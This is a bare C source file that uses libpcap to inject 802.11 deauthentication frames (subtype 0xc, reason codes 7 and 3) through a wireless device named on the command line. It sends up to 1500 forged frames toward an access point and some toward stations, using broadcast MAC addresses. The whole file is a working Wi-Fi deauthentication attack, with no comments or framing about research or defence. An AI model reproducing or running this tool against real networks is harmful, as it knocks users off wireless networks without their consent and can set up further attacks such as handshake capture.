#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <pcap.h>
#include <string.h>
#include <signal.h>

#include "packet.h"

static int running;

uint8_t *construct_packet(struct header_radiotap*, struct header_management*, uint16_t, size_t*);
void terminate(int);
int main(int argc, char *argv[]) {
	pcap_t *handle = NULL;
	char errbuf[PCAP_ERRBUF_SIZE], *filter = NULL, *dev;
	bpf_u_int32 ipaddr, netmask;
	struct bpf_program fp;
	struct header_radiotap *tap;
	struct header_management *headerToSta, *headerToAp;
	struct mac80211_control ctrl;

	size_t lenSta, lenAp;
	uint8_t macSta[6] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff },
		macAp[6] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff },
		 *packetToSta, *packetToAp;
	uint16_t reason;
	struct sigaction new_action, old_action;

	/* Set up the structure to specify the new action. */
	new_action.sa_handler = terminate;
	sigemptyset (&new_action.sa_mask);
	new_action.sa_flags = 0;


	running  = 1;
	sigaction(SIGINT, &new_action, NULL);

	if(argc < 2) {
		fprintf(stderr, "No device specified");
		exit(EXIT_FAILURE);
	}
	dev = argv[1];

	if(pcap_lookupnet(dev, &ipaddr, &netmask, errbuf) == -1) {
		fprintf(stderr, "Error on device lookup\n%s\n", errbuf);
		exit(EXIT_FAILURE);
	}

	handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if(handle == NULL) {
		fprintf(stderr, "Couldn't open device %s\n", errbuf);
		exit(EXIT_FAILURE);
	}
	ctrl = (struct mac80211_control) {
		.protocol = 0x0,
		.type = 0x0,
		.subtype = 0xc,
		.toDS = 0,
		.fromDS = 0,
		.frags = 0,
		.retry = 0,
		.powerman = 0,
		.data = 0,
		.protected = 0,
		.order = 0,
	};

	tap = construct_header_radiotap();
	headerToSta = construct_header_management(macAp, macSta, macAp, &ctrl);
	headerToAp = construct_header_management(macSta, macAp, macAp, &ctrl);
	reason = 0x3;

	int i = 0;
	//long long total = 0;
	uint16_t total = 0;
	while(running && total < 1500) {
		headerToSta->seqctrl = total<<4;
		headerToAp->seqctrl = total<<4;
		packetToSta = construct_packet(tap, headerToSta, 0x7, &lenSta);

		packetToAp = construct_packet(tap, headerToAp, 0x3, &lenAp);
		
		if(total < 10)
			pcap_inject(handle, (void*)packetToSta, (int)lenSta);
		pcap_inject(handle, (void*)packetToAp, (int)lenAp);
		
		usleep(50000);
		printf("\r%05d packets", ++total);
		fflush(stdout);

		free(packetToSta);
		free(packetToAp);
	}
	free(tap);
	//free(packetToSta);
	free(headerToSta);
	free(headerToAp);
	pcap_close(handle);
	printf("\n");
	return 0;
}

uint8_t *construct_packet(struct header_radiotap *tap, struct header_management *header, uint16_t reason, size_t *len) {
	uint8_t *packet = (uint8_t*) malloc( tap->len + sizeof(struct header_management) + 2);
	size_t pos = 0;

	memcpy(packet+pos, tap, tap->len);
	pos += tap->len;

	memcpy(packet+pos, header, sizeof(struct header_management));
	pos += sizeof(struct header_management);

	memcpy(packet+pos, &reason, 2);
	pos += 2;
	*len = pos;
	return packet;
}

void terminate(int sig) {
	if(sig == SIGINT) {
		running = 0;
	}
}
